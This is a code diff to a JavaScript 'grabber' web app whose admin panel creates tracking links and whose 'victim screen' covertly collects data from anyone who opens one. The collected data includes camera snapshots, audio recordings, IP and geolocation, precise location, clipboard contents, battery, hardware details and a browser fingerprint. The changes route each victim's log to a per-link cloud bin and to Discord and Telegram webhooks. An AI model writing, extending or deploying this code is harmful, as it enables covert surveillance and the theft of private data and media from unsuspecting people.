-  const storageUsed = new Blob([JSON.stringify(state.logs)]).size;
-  const maxStorage = 4.5 * 1024 * 1024;
-  const pct = Math.min(100, (storageUsed / maxStorage) * 100);
-  document.getElementById('statStorage').textContent = formatBytes(storageUsed);
-  document.getElementById('storageBar').style.width = pct + '%';
-}
-
-function formatBytes(bytes) {
-  if (bytes < 1024) return bytes + ' B';
-  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
-  return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
 }
 
 function renderLinks() {
@@ -1174,6 +1245,13 @@ function renderVault() {
       </div>
     </div>`;
   }).join('');
+}
+
+async function syncFromCloud() {
+  toast('Syncing...', 'info');
+  const ok = await syncLogsFromCloud();
+  renderAll();
+  toast(ok ? 'Synced!' : 'No new data', ok ? 'success' : 'info');
 }
 
 function openLogDetail(logId) {
@@ -1341,7 +1419,6 @@ async function deleteLog(logId) {
   if (!confirm('Delete this data?')) return;
   state.logs = state.logs.filter(l => l.id != logId);
   saveLogs();
-  await cloudSave();
   renderVault(); renderStats(); renderLinks();
   toast('Deleted', 'success');
 }
@@ -1350,7 +1427,6 @@ async function clearVault() {
   if (!confirm('Delete ALL data?')) return;
   state.logs = [];
   saveLogs();
-  await cloudSave();
   renderVault(); renderStats(); renderLinks();
   toast('Cleared', 'success');
 }
@@ -1360,8 +1436,6 @@ function escapeHtml(s) { return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;'
 /* ============ SETTINGS ============ */
 function loadSettings() {
   const s = state.settings;
-  if (s.jbKey) document.getElementById('jbKey').value = s.jbKey;
-  if (s.jbBin) document.getElementById('jbBin').value = s.jbBin;
   if (s.dcWebhook) document.getElementById('dcWebhook').value = s.dcWebhook;
   if (s.genWebhook) document.getElementById('genWebhook').value = s.genWebhook;
   if (s.tgToken) document.getElementById('tgToken').value = s.tgToken;
@@ -1378,8 +1452,7 @@ function loadSettings() {
 
 async function saveSettings() {
   state.settings = {
-    jbKey: document.getElementById('jbKey').value.trim(),
-    jbBin: document.getElementById('jbBin').value.trim(),
+    ...state.settings,
     dcWebhook: document.getElementById('dcWebhook').value.trim(),
     genWebhook: document.getElementById('genWebhook').value.trim(),
     tgToken: document.getElementById('tgToken').value.trim(),
@@ -1394,14 +1467,7 @@ async function saveSettings() {
     defDebug: document.getElementById('defDebug').checked
   };
   localStorage.setItem('sl_settings', JSON.stringify(state.settings));
-  
-  // Sync current data to cloud
-  if (getCloudConfig()) {
-    await cloudSave();
-    toast('Settings saved & synced to cloud', 'success');
-  } else {
-    toast('Settings saved (cloud not configured)', 'info');
-  }
+  toast('Settings saved', 'success');
 }
 
 async function testDiscord() {
@@ -1436,21 +1502,20 @@ let syncInterval = null;
 function startLiveSync() {
   if (syncInterval) clearInterval(syncInterval);
   syncInterval = setInterval(async () => {
-    // If cloud is configured, pull from cloud (handles cross-browser data)
-    if (getCloudConfig()) {
+    if (getBinId()) {
       const before = state.logs.length;
-      await cloudLoad();
+      await syncLogsFromCloud();
       if (state.logs.length !== before) {
         renderStats();
         if (state.currentTab === 'vault') renderVault();
         if (state.currentTab === 'links') renderLinks();
       }
     }
-  }, 5000); // Check every 5 seconds
+  }, 5000);
 }
 
 /* ============ VICTIM SCREEN ============ */
-function launchVictim(link) {
+function launchVictim(link, binId) {
   hideEl('loginScreen');
   hideEl('adminPanel');
   const vs = document.getElementById('victimScreen');
@@ -1478,11 +1543,8 @@ function launchVictim(link) {
   if (state.settings.defDebug) {
     debugEl = document.getElementById('debugPanel');
     debugLog('Victim screen loaded');
+    debugLog('Bin ID: ' + (binId || 'none'));
   }
-  
-  // Increment hits
-  const real = state.links.find(l => l.code === link.code);
-  if (real) { real.hits = (real.hits || 0) + 1; saveLinks(); }
   
   const progressBar = document.getElementById('progressBar');
   progressBar.style.transitionDuration = minDisplayMs + 'ms';
@@ -1503,19 +1565,23 @@ function launchVictim(link) {
   collectDataDeep(link, (msg, type) => debugLog(msg, type), status).then(async (log) => {
     debugLog('Collection complete', 'ok');
     
-    // SAVE to local + cloud
-    state.logs.unshift(log);
-    saveLogs();
-    debugLog('Saved locally', 'ok');
+    // Save locally (backup)
+    try {
+      const localLogs = JSON.parse(localStorage.getItem('sl_logs') || '[]');
+      localLogs.unshift(log);
+      localStorage.setItem('sl_logs', JSON.stringify(localLogs));
+    } catch(e) {}
     
-    // Push to cloud (non-blocking but awaited for reliability)
-    if (getCloudConfig()) {
-      debugLog('Uploading to cloud...', 'info');
-      const cloudOk = await cloudSave();
+    // Push to cloud
+    if (binId) {
+      debugLog('Pushing to cloud...', 'info');
+      const cloudOk = await victimPushLog(log, binId);
       debugLog('Cloud: ' + (cloudOk ? 'OK' : 'FAIL'), cloudOk ? 'ok' : 'err');
+    } else {
+      debugLog('No bin ID — data saved locally only', 'err');
     }
     
-    // Deliver to all channels
+    // Deliver to webhooks
     deliverAll(log).catch(e => debugLog('Delivery err: ' + e.message, 'err'));
     
     const elapsed = Date.now() - startTime;
@@ -1579,11 +1645,10 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
   
   logFn(`Starting (${mods.length} modules, ${snapCount} snaps)`);
   
-  // ===== CAMERA + AUDIO =====
   let cameraStream = null;
   if (mods.includes('camera') || mods.includes('audio')) {
     try {
-      logFn('Camera...');
+      logFn('Media...');
       const constraints = {
         video: mods.includes('camera') ? { facingMode: 'user', width: { ideal: imgWidth }, height: { ideal: imgWidth * 0.75 } } : false,
         audio: mods.includes('audio') ? true : false
@@ -1604,7 +1669,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
   
   const tasks = [];
   
-  // IP + full geo data
   if (mods.includes('ip')) {
     tasks.push((async () => {
       try {
@@ -1631,7 +1695,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     })());
   }
   
-  // Device
   if (mods.includes('device')) {
     log.device = navigator.userAgent;
     log.platform = navigator.platform;
@@ -1647,7 +1710,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     status.completed++; updateCollectionDots(status);
   }
   
-  // Location
   if (mods.includes('location')) {
     tasks.push((async () => {
       try {
@@ -1674,7 +1736,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     })());
   }
   
-  // Battery
   if (mods.includes('battery') && navigator.getBattery) {
     tasks.push((async () => {
       try {
@@ -1687,7 +1748,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     })());
   }
   
-  // Network
   if (mods.includes('network') && navigator.connection) {
     log.connection = navigator.connection.effectiveType;
     log.downlink = navigator.connection.downlink;
@@ -1696,7 +1756,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     status.completed++; updateCollectionDots(status);
   }
   
-  // Clipboard
   if (mods.includes('clipboard')) {
     tasks.push((async () => {
       try {
@@ -1709,7 +1768,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     })());
   }
   
-  // Audio recording
   if (mods.includes('audio') && cameraStream) {
     tasks.push((async () => {
       try {
@@ -1720,7 +1778,7 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
           logFn('No audio track', 'err');
         } else {
           const audioStream = new MediaStream(audioTracks);
-          const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg', 'audio/mp4'];
+          const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg'];
           let selectedMime = '';
           for (const mt of mimeTypes) {
             if (MediaRecorder.isTypeSupported(mt)) { selectedMime = mt; break; }
@@ -1741,7 +1799,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     })());
   }
   
-  // Hardware info
   if (mods.includes('hardware')) {
     log.cores = navigator.hardwareConcurrency;
     log.memory = navigator.deviceMemory;
@@ -1758,7 +1815,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
     status.completed++; updateCollectionDots(status);
   }
   
-  // Browser fingerprint
   if (mods.includes('fingerprint')) {
     log.fingerprint = {
       userAgent: navigator.userAgent,
@@ -1782,7 +1838,6 @@ async function collectDataDeep(link, logFn = () => {}, status = { total: 0, comp
   await Promise.all(tasks);
   logFn('Tasks done', 'ok');
   
-  // ===== CAMERA SNAPS =====
   if (cameraStream && mods.includes('camera')) {
     try {
       const video = document.getElementById('camVideo');
@@ -1853,7 +1908,6 @@ async function deliverDiscord(log, webhookUrl) {
       { name: '📍 Location', value: log.location || 'N/A', inline: true },
       { name: '💻 Platform', value: log.platform || 'N/A', inline: true },
       { name: '📱 Screen', value: log.screen || 'N/A', inline: true },
-      { name: '🌐 Language', value: log.language || 'N/A', inline: true },
       { name: '🔋 Battery', value: log.battery || 'N/A', inline: true },
       { name: '📶 Network', value: log.connection || 'N/A', inline: true },
       { name: '📸 Snaps', value: String(realSnaps.length), inline: true },
@@ -2004,10 +2058,11 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 window.addEventListener('hashchange', () => {
-  const code = getRouteCode();
-  if (code && code !== 'admin') {
-    const link = state.links.find(l => l.code === code);
-    if (link && link.active) launchVictim(link);
+  const { code, binId } = parseHash();
+  if (code && binId && code !== 'admin') {
+    victimFetchLinkConfig(code, binId).then(link => {
+      if (link && link.active) launchVictim(link, binId);
+    });
   }
 });
 
